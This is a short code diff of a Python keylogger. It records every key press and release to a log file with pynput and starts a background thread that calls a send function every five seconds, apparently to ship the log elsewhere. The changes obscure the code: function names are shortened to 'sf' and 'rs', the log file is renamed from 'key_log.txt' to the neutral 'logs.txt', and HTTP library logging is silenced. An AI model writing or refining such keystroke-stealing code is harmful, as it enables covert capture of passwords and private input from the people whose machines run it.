@@ -1,17 +1,18 @@
 import logging
 import time
 from pynput import keyboard
-from client_p import sendFile
+from client_p import sf
 import threading
 
-def RunSend():
+def rs():
     while(True):
         time.sleep(5)
-        sendFile()
+        sf()
 
 
 log_dir = "./"
-logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')
+logging.basicConfig(filename=(log_dir + "logs.txt"), level=logging.DEBUG, format='%(asctime)s, %(message)s')
+logging.getLogger("urllib3").setLevel(logging.WARNING)
 
 def on_press(key):
     try:
@@ -22,7 +23,7 @@ def on_press(key):
 def on_release(key):
     logging.info('released : {0}'.format(key))
 
-threading.Thread(target=RunSend).start()
+threading.Thread(target=rs).start()
 
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener :
     listener.join()
